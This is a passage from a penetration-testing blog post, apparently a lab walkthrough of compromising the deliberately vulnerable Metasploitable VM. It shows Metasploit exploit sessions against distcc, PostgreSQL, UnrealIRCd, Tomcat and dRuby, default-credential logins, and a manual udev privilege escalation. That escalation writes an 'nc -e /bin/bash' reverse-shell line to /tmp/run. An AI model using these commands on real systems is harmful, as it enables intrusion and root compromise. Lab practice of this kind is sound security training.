+<p>   RHOST  192.168.127.154  yes       The target address
+   RPORT  3632             yes       The target port</p>
+
+<p>Payload options (cmd/unix/reverse):</p>
+
+<p>   Name   Current Setting  Required  Description</p>
+
+<hr />
+
+<p>   LHOST                   yes       The listen address
+   LPORT  4444             yes       The listen port</p>
+
+<p>Exploit target:</p>
+
+<p>   Id  Name</p>
+
+<hr />
+
+<p>   0   Automatic Target</p>
+
+<p>msf exploit(distcc_exec) > set LHOST 192.168.127.159
+LHOST => 192.168.127.159
+msf exploit(distcc_exec) > exploit</p>
+
+<p>[<em>] Started reverse double handler
+[</em>] Accepted the first client connection&hellip;
+[<em>] Accepted the second client connection&hellip;
+[</em>] Command: echo VhuwDGXAoBmUMNcg;
+[<em>] Writing to socket A
+[</em>] Writing to socket B
+[<em>] Reading from sockets&hellip;
+[</em>] Reading from socket B
+[<em>] B: &ldquo;VhuwDGXAoBmUMNcg\r\n&rdquo;
+[</em>] Matching&hellip;
+[<em>] A is input&hellip;
+[</em>] Command shell session 1 opened (192.168.127.159:4444 &ndash;> 192.168.127.154:52283) at 2014-06-05 21:34:46 +0300</p>
+
+<p>whoami
+daemon
+```</p>
+
+<p>So we have a low privilege account. Time for some local privilege escalation. I will use this exploit: <a href="http://www.exploit-db.com/exploits/8572/">http://www.exploit-db.com/exploits/8572/</a></p>
+
+<p><strong>Description</strong></p>
+
+<p>udev before 1.4.1 does not verify whether a NETLINK message originates from kernel space, which allows local users to gain privileges by sending a NETLINK message from user space.</p>
+
+<p><strong>Usage</strong></p>
+
+<p>Pass the PID of the udevd netlink socket (listed in /proc/net/netlink, usually is the udevd PID minus 1) as argv[1].</p>
+
+<p>The exploit will execute /tmp/run as root so throw whatever payload you want in there.</p>
+
+<p>Ok, on the command line on the victim, I looked for netcat and fortunately, it&rsquo;s installed:</p>
+
+<p><code>plain
+whereis nc
+nc: /bin/nc.traditional /bin/nc /usr/share/man/man1/nc.1.gz
+</code></p>
+
+<p>So I will compile the exploit and send it over netcat. I am on a 64 bit Kali and the target is 32 bit, so I compile it explicitly for 32 bit:</p>
+
+<p><code>plain
+gcc -m32 8572.c -o 8572
+nc -vv -l -p 5555 &lt; 8572
+</code></p>
+
+<p>From the victim, I go to the /tmp/ directory and grab the exploit from the attacking machine:</p>
+
+<p><code>plain
+nc -v -n 192.168.127.159 5555 &gt; 8572
+</code></p>
+
+<p>Next, let&rsquo;s look for the PID:</p>
+
+<p><code>plain
+cat /proc/net/netlink
+</code></p>
+
+<p>And the relevant line is:</p>
+
+<p><code>plain
+sk       Eth Pid    Groups   Rmem     Wmem     Dump     Locks
+df8cc200 15  2767   00000001 0        0        00000000 2
+</code></p>
+
+<p>Check that this is the correct PID by looking at the udev service:</p>
+
+<p><code>plain
+ps aux | grep udev
+root      2768  0.0  0.1   2092   620 ?        S&lt;s  14:11   0:00 /sbin/udevd --daemon
+</code></p>
+
+<p>It appears to be the right one (2768 &ndash; 1 = 2767)</p>
+
+<p>Next, put some payload in /tmp/run, since that will be executed by the exploit. I will use netcat to connect to the atacker machine and give it a shell:</p>
+
+<p><code>plain
+echo '#!/bin/bash' &gt; /tmp/run
+echo 'nc -e /bin/bash 192.168.127.159 5555' &gt;&gt; /tmp/run
+</code></p>
+
+<p>On the attacker machine, listen on port 5555:</p>
+
+<p><code>plain
+nc -v -l -p 5555
+</code></p>
+
+<p>And on the victim machine, now that all is set up, I just make the exploit executable and run it:</p>
+
+<p><code>plain
+chmod +x 8572
+./8572 2767
+</code></p>
+
+<p>Now check our local netcat listener for the root shell:</p>
+
+<p><code>plain
+nc: connect to 192.168.127.159 5555 from 192.168.127.154 (192.168.127.154) 35539 [35539]
+whoami
+root
+</code></p>
+
+<p>A bit on effort on that one, but all the more rewarding! Let&rsquo;s move on.</p>
+
+<h3>Port 5432 postgresql</h3>
+
+<p>Since I already saw earlier that the mysql database wasn&rsquo;t password protected, I will try a bruteforce auxiliary module to see if I can get in this one.</p>
+
+<p><strong>PostgreSQL Login Utility</strong></p>
+
+<blockquote><p>This module attempts to authenticate against a PostgreSQL instance using username and password combinations indicated by the USER_FILE, PASS_FILE, and
+USERPASS_FILE options.</p></blockquote>
+
+<p>``` plain
+msf > use auxiliary/scanner/postgres/postgres_login
+msf auxiliary(postgres_login) > show options</p>
+
+<p>Module options (auxiliary/scanner/postgres/postgres_login):</p>
+
+<p>   Name              Current Setting                                                             Required  Description</p>
+
+<hr />
+
+<p>   BLANK_PASSWORDS   false                                                                       no        Try blank passwords for all users
+   BRUTEFORCE_SPEED  5                                                                           yes       How fast to bruteforce, from 0 to 5
+   DATABASE          template1                                                                   yes       The database to authenticate against
+   DB_ALL_CREDS      false                                                                       no        Try each user/password couple stored in the current database
+   DB_ALL_PASS       false                                                                       no        Add all passwords in the current database to the list
+   DB_ALL_USERS      false                                                                       no        Add all users in the current database to the list
+   PASSWORD                                                                                      no        A specific password to authenticate with
+   PASS_FILE         /opt/metasploit/apps/pro/msf3/data/wordlists/postgres_default_pass.txt      no        File containing passwords, one per line
+   RETURN_ROWSET     true                                                                        no        Set to true to see query result sets
+   RHOSTS                                                                                        yes       The target address range or CIDR identifier
+   RPORT             5432                                                                        yes       The target port
+   STOP_ON_SUCCESS   false                                                                       yes       Stop guessing when a credential works for a host
+   THREADS           1                                                                           yes       The number of concurrent threads
+   USERNAME          postgres                                                                    no        A specific username to authenticate as
+   USERPASS_FILE     /opt/metasploit/apps/pro/msf3/data/wordlists/postgres_default_userpass.txt  no        File containing (space-seperated) users and passwords, one pair per line
+   USER_AS_PASS      false                                                                       no        Try the username as the password for all users
+   USER_FILE         /opt/metasploit/apps/pro/msf3/data/wordlists/postgres_default_user.txt      no        File containing users, one per line
+   VERBOSE           true                                                                        yes       Whether to print output for all attempts</p>
+
+<p>msf auxiliary(postgres_login) > set RHOSTS 192.168.127.154
+RHOSTS => 192.168.127.154
+msf auxiliary(postgres_login) > set STOP_ON_SUCCESS true
+STOP_ON_SUCCESS => true
+msf auxiliary(postgres_login) > run</p>
+
+<p>[<em>] 192.168.127.154:5432 Postgres &ndash; [01/20] &ndash; Trying username:&lsquo;postgres&rsquo; with password:&lsquo;postgres&rsquo; on database &lsquo;template1&rsquo;
+[+] 192.168.127.154:5432 Postgres &ndash; Logged in to &lsquo;template1&rsquo; with &lsquo;postgres&rsquo;:&lsquo;postgres&rsquo;
+[+] 192.168.127.154:5432 Postgres &ndash; Success: postgres:postgres (Database &lsquo;template1&rsquo; succeeded.)
+[</em>] 192.168.127.154:5432 Postgres &ndash; Disconnected
+[<em>] Scanned 1 of 1 hosts (100% complete)
+[</em>] Auxiliary module execution completed
+```
+So it&rsquo;s possible to log in to this database like earlier with mysql, but I searched through Metasploit&rsquo;s available exploits, and I stumbled upon one that can further the exploitation:</p>
+
+<p><strong>PostgreSQL for Linux Payload Execution</strong></p>
+
+<blockquote><p>On some default Linux installations of PostgreSQL, the postgres service account may write to the /tmp directory, and may source UDF Shared Libraries&rsquo;s
+om there as well, allowing execution of arbitrary code. This module compiles a Linux shared object file, uploads it to the target host via the UPDATE
+pg_largeobject method of binary injection, and creates a UDF (user defined function) from that shared object. Because the payload is run as the shared
+object&rsquo;s constructor, it does not need to conform to specific Postgres API versions.</p></blockquote>
+
+<p>``` plain
+msf > use exploit/linux/postgres/postgres_payload
+msf exploit(postgres_payload) > show options</p>
+
+<p>Module options (exploit/linux/postgres/postgres_payload):</p>
+
+<p>   Name      Current Setting  Required  Description</p>
+
+<hr />
+
+<p>   DATABASE  template1        yes       The database to authenticate against
+   PASSWORD                   no        The password for the specified username. Leave blank for a random password.
+   RHOST                      yes       The target address
+   RPORT     5432             yes       The target port
+   USERNAME  postgres         yes       The username to authenticate as
+   VERBOSE   false            no        Enable verbose output</p>
+
+<p>Exploit target:</p>
+
+<p>   Id  Name</p>
+
+<hr />
+
+<p>   0   Linux x86</p>
+
+<p>msf exploit(postgres_payload) > set payload linux/x86/meterpreter/reverse_tcp
+payload => linux/x86/meterpreter/reverse_tcp
+msf exploit(postgres_payload) > set LHOST 192.168.127.159
+LHOST => 192.168.127.159
+set PASSWORD postgres
+PASSWORD => postgres
+msf exploit(postgres_payload) > exploit</p>
+
+<p>[<em>] Started reverse handler on 192.168.127.159:4444
+[</em>] 192.168.127.154:5432 &ndash; PostgreSQL 8.3.1 on i486-pc-linux-gnu, compiled by GCC cc (GCC) 4.2.3 (Ubuntu 4.2.3-2ubuntu4)
+[<em>] Uploaded as /tmp/uVhDfWDg.so, should be cleaned up automatically
+[</em>] Transmitting intermediate stager for over-sized stage&hellip;(100 bytes)
+[<em>] Sending stage (1228800 bytes) to 192.168.127.154
+[</em>] Meterpreter session 1 opened (192.168.127.159:4444 &ndash;> 192.168.127.154:37141) at 2014-06-06 22:49:17 +0300
+```</p>
+
+<p>From here we again have to elevate our privileges. I will exploit the same vulnerability with the udev exploit, but this time from inside Metasploit:</p>
+
+<p>``` plain
+meterpreter > background
+[*] Backgrounding session 1&hellip;
+msf exploit(postgres_payload) > use exploit/linux/local/udev_netlink
+msf exploit(udev_netlink) > show options</p>
+
+<p>Module options (exploit/linux/local/udev_netlink):</p>
+
+<p>   Name         Current Setting  Required  Description</p>
+
+<hr />
+
+<p>   NetlinkPID                    no        Usually udevd pid-1.  Meterpreter sessions will autodetect
+   SESSION                       yes       The session to run this module on.
+   WritableDir  /tmp             yes       A directory where we can write files (must not be mounted noexec)</p>
+
+<p>Exploit target:</p>
+
+<p>   Id  Name</p>
+
+<hr />
+
+<p>   0   Linux x86</p>
+
+<p>msf exploit(udev_netlink) > set SESSION 1
+SESSION => 1
+msf exploit(udev_netlink) > exploit</p>
+
+<p>[<em>] Started reverse handler on 192.168.127.159:4444
+[</em>] Attempting to autodetect netlink pid&hellip;
+[<em>] Meterpreter session, using get_processes to find netlink pid
+[</em>] udev pid: 2770
+[+] Found netlink pid: 2769
+[<em>] Writing payload executable (274 bytes) to /tmp/rzIcSWveTb
+[</em>] Writing exploit executable (1879 bytes) to /tmp/DQDnKUFLzR
+[<em>] chmod'ing and running it&hellip;
+[</em>] Command shell session 2 opened (192.168.127.159:4444 &ndash;> 192.168.127.154:33383) at 2014-06-06 23:03:13 +0300</p>
+
+<p>whoami
+root
+```</p>
+
+<p>So, the same exploit that I manually used earlier was very easy and quick in Metasploit. Onwards!</p>
+
+<h3>Port 5900 vnc</h3>
+
+<p>The Nessus scan reported that the server is using the password &lsquo;password&rsquo;. So I will use vncviewer to connect to it:</p>
+
+<p><code>plain
+vncviewer 192.168.127.154
+Connected to RFB server, using protocol version 3.3
+Performing standard VNC authentication
+Password:
+Authentication successful
+Desktop name "root's X desktop (metasploitable:0)"
+VNC server default format:
+  32 bits per pixel.
+  Least significant byte first in each pixel.
+  True colour: max red 255 green 255 blue 255, shift red 16 green 8 blue 0
+Using default colormap which is TrueColor.  Pixel format:
+  32 bits per pixel.
+  Least significant byte first in each pixel.
+  True colour: max red 255 green 255 blue 255, shift red 16 green 8 blue 0
+</code></p>
+
+<p><img class="center" src="/images/vnc.png" title="&lsquo;vnc shell&rsquo; &lsquo;vnc&rsquo;" ></p>
+
+<p>And we have another root shell.</p>
+
+<h3>Port 6667 irc</h3>
+
+<p>An exploit is available for this:</p>
+
+<p><strong>UnrealIRCD 3.2.8.1 Backdoor Command Execution</strong></p>
+
+<blockquote><p>This module exploits a malicious backdoor that was added to the Unreal IRCD 3.2.8.1 download archive. This backdoor was present in the Unreal3.2.8.1.tar.gz
+archive between November 2009 and June 12th 2010.</p></blockquote>
+
+<p>``` plain
+msf > use exploit/unix/irc/unreal_ircd_3281_backdoor
+msf exploit(unreal_ircd_3281_backdoor) > show options</p>
+
+<p>Module options (exploit/unix/irc/unreal_ircd_3281_backdoor):</p>
+
+<p>   Name   Current Setting  Required  Description</p>
+
+<hr />
+
+<p>   RHOST                   yes       The target address
+   RPORT  6667             yes       The target port</p>
+
+<p>Exploit target:</p>
+
+<p>   Id  Name</p>
+
+<hr />
+
+<p>   0   Automatic Target</p>
+
+<p>msf exploit(unreal_ircd_3281_backdoor) > set RHOST 192.168.127.154
+RHOST => 192.168.127.154
+msf exploit(unreal_ircd_3281_backdoor) > set payload cmd/unix/reverse
+payload => cmd/unix/reverse
+msf exploit(unreal_ircd_3281_backdoor) > set LHOST 192.168.127.159
+LHOST => 192.168.127.159
+msf exploit(unreal_ircd_3281_backdoor) > exploit</p>
+
+<p>[<em>] Started reverse double handler
+[</em>] Connected to 192.168.127.154:6667&hellip;</p>
+
+<pre><code>:irc.Metasploitable.LAN NOTICE AUTH :*** Looking up your hostname...
+:irc.Metasploitable.LAN NOTICE AUTH :*** Couldn't resolve your hostname; using your IP address instead
+</code></pre>
+
+<p>[<em>] Sending backdoor command&hellip;
+[</em>] Accepted the first client connection&hellip;
+[<em>] Accepted the second client connection&hellip;
+[</em>] Command: echo qcHh6jsH8rZghWdi;
+[<em>] Writing to socket A
+[</em>] Writing to socket B
+[<em>] Reading from sockets&hellip;
+[</em>] Reading from socket B
+[<em>] B: &ldquo;qcHh6jsH8rZghWdi\r\n&rdquo;
+[</em>] Matching&hellip;
+[<em>] A is input&hellip;
+[</em>] Command shell session 3 opened (192.168.127.159:4444 &ndash;> 192.168.127.154:41975) at 2014-06-06 23:31:44 +0300</p>
+
+<p>whoami
+root
+```</p>
+
+<h3>Port 8180 tomcat</h3>
+
+<p>First, let&rsquo;s see what information we can get using the <strong>Tomcat Administration Tool Default Access</strong> module:</p>
+
+<p>``` plain
+msf > use auxiliary/admin/http/tomcat_administration
+msf auxiliary(tomcat_administration) > show options</p>
+
+<p>Module options (auxiliary/admin/http/tomcat_administration):</p>
+
+<p>   Name         Current Setting  Required  Description</p>
+
+<hr />
+
+<p>   Proxies                       no        Use a proxy chain
+   RHOSTS                        yes       The target address range or CIDR identifier
+   RPORT        8180             yes       The target port
+   THREADS      1                yes       The number of concurrent threads
+   TOMCAT_PASS                   no        The password for the specified username
+   TOMCAT_USER                   no        The username to authenticate as
+   VHOST                         no        HTTP server virtual host</p>
+
+<p>msf auxiliary(tomcat_administration) > set RHOSTS 192.168.127.154
+RHOSTS => 192.168.127.154
+msf auxiliary(tomcat_administration) > run</p>
+
+<p>[<em>] <a href="http://192.168.127.154:8180/admin">http://192.168.127.154:8180/admin</a> [Apache-Coyote/1.1] [Apache Tomcat/5.5] [Tomcat Server Administration] [tomcat/tomcat]
+[</em>] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+```</p>
+
+<p>With credentials in hand, now we can use the <strong>Apache Tomcat Manager Application Deployer Authenticated Code Execution</strong> exploit:</p>
+
+<blockquote><p>This module can be used to execute a payload on Apache Tomcat servers that have an exposed &ldquo;manager&rdquo; application. The payload is uploaded as a WAR archive
+containing a jsp application using a PUT request. The manager application can also be abused using /manager/html/upload, but that method is not implemented in > this module. NOTE: The compatible payload sets vary based on the selected target. For example, you must select the Windows target to use native Windows
+payloads.</p></blockquote>
+
+<p>``` plain
+msf > use exploit/multi/http/tomcat_mgr_deploy
+msf exploit(tomcat_mgr_deploy) > show options</p>
+
+<p>Module options (exploit/multi/http/tomcat_mgr_deploy):</p>
+
+<p>   Name      Current Setting  Required  Description</p>
+
+<hr />
+
+<p>   PASSWORD                   no        The password for the specified username
+   PATH      /manager         yes       The URI path of the manager app (/deploy and /undeploy will be used)
+   Proxies                    no        Use a proxy chain
+   RHOST                      yes       The target address
+   RPORT     80               yes       The target port
+   USERNAME                   no        The username to authenticate as
+   VHOST                      no        HTTP server virtual host</p>
+
+<p>Exploit target:</p>
+
+<p>   Id  Name</p>
+
+<hr />
+
+<p>   0   Automatic</p>
+
+<p>msf exploit(tomcat_mgr_deploy) > set PASSWORD tomcat
+PASSWORD => tomcat
+msf exploit(tomcat_mgr_deploy) > set RHOST 192.168.127.154
+RHOST => 192.168.127.154
+msf exploit(tomcat_mgr_deploy) > set USERNAME tomcat
+USERNAME => tomcat
+msf exploit(tomcat_mgr_deploy) > set PASSWORD tomcat
+PASSWORD => tomcat
+msf exploit(tomcat_mgr_deploy) > set RHOST 192.168.127.154
+RHOST => 192.168.127.154
+msf exploit(tomcat_mgr_deploy) > set USERNAME tomcat
+USERNAME => tomcat
+msf exploit(tomcat_mgr_deploy) > set RPORT 8180
+RPORT => 8180
+msf exploit(tomcat_mgr_deploy) > set payload  java/meterpreter/reverse_tcp
+payload => java/meterpreter/reverse_tcp
+msf exploit(tomcat_mgr_deploy) > set LHOST 192.168.127.159
+LHOST => 192.168.127.159
+msf exploit(tomcat_mgr_deploy) > exploit</p>
+
+<p>[<em>] Started reverse handler on 192.168.127.159:8888
+[</em>] Attempting to automatically select a target&hellip;
+[<em>] Automatically selected target &ldquo;Linux x86&rdquo;
+[</em>] Uploading 13833 bytes as RuoE02Uo7DeSsaVp7nmb79cq.war &hellip;
+[<em>] Executing /RuoE02Uo7DeSsaVp7nmb79cq/19CS3RJj.jsp&hellip;
+[</em>] Undeploying RuoE02Uo7DeSsaVp7nmb79cq &hellip;
+[*] Command shell session 4 opened (192.168.127.159:8888 &ndash;> 192.168.127.154:33966) at 2014-06-06 23:51:01 +0300</p>
+
+<p>whoami
+tomcat55
+```</p>
+
+<p>We can elevate our privileges using the udev exploit from earlier, so I won&rsquo;t go over it again.</p>
+
+<h3>Port 8787 drb</h3>
+
+<p>First I wanted to know what this drb is, since I wasn&rsquo;t familiar with it.</p>
+
+<blockquote><p>Distributed Ruby or DRb allows Ruby programs to communicate with each other on the same machine or over a network. DRb uses remote method
+invocation (RMI) to pass commands and data between processes (Wikipedia)</p></blockquote>
+
+<p>Then I searched in Metasploit for an exploit, and luckily, I got a hit:</p>
+
+<p><strong>Distributed Ruby Send instance_eval/syscall Code Execution</strong></p>
+
+<blockquote><p>This module exploits remote code execution vulnerabilities in dRuby</p></blockquote>
+
+<p>``` plain
+msf > use exploit/linux/misc/drb_remote_codeexec
+msf exploit(drb_remote_codeexec) > show options</p>
+
+<p>Module options (exploit/linux/misc/drb_remote_codeexec):</p>
+
+<p>   Name  Current Setting  Required  Description</p>
+
+<hr />
+
+<p>   URI                    yes       The dRuby URI of the target host (druby://host:port)</p>
+
+<p>Exploit target:</p>
+
+<p>   Id  Name</p>
+
+<hr />
+
+<p>   0   Automatic</p>
+
+<p>msf exploit(drb_remote_codeexec) > set URI druby://192.168.127.154:8787
+URI => druby://192.168.127.154:8787</p>
+
+<p>msf exploit(drb_remote_codeexec) > set payload cmd/unix/reverse
+payload => cmd/unix/reverse
+msf exploit(drb_remote_codeexec) > set LHOST 192.168.127.159
+LHOST => 192.168.127.159
+msf exploit(drb_remote_codeexec) > exploit</p>
+
+<p>[<em>] Started reverse double handler
+[</em>] trying to exploit instance_eval
+[<em>] instance eval failed, trying to exploit syscall
+[&ndash;] Exploit failed: Errno::EINVAL Invalid argument
+[</em>] Accepted the first client connection&hellip;
+[<em>] Accepted the second client connection&hellip;
+[</em>] Command: echo 7Kx3j4QvoI7LOU5z;
+[<em>] Writing to socket A
+[</em>] Writing to socket B
+[<em>] Reading from sockets&hellip;
+[</em>] Reading from socket B
+[<em>] B: &ldquo;7Kx3j4QvoI7LOU5z\r\n&rdquo;
+[</em>] Matching&hellip;
+[<em>] A is input&hellip;
+[</em>] Command shell session 1 opened (192.168.127.159:4444 &ndash;> 192.168.127.154:35889) at 2014-06-08 16:51:56 +0300</p>
+
+<p>whoami
+root
+```</p>
+
+<p>Another port, another shell!</p>
+
+<p>This turned out to be a a very lengthy post. There were some ports I couldn&rsquo;t find an exploit for, so can&rsquo;t determine if the underlying services were exploitable or not. Overall, owning Metasploitable in multiple ways and documenting it was the goal of this post.</p>
+
+<p>Today&rsquo;s cookie:</p>
+
+<blockquote><p>You will be a winner today.  Pick a fight with a four-year-old.</p></blockquote>
+]]></content>
+  </entry>
+  
+</feed>
